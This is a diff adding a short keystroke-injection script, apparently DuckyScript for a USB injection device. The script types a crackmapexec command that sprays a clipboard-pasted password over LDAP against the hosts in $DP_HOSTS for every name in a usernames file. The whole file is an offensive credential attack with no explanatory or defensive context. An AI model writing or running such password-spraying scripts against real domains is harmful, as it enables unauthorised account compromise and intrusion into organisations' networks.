@@ -1,0 +1,5 @@
+DEFAULTCHARDELAY 15
+
+STRING crackmapexec ldap $DP_HOSTS -u ./usernames.txt -p '
+CTRL v
+STRING '
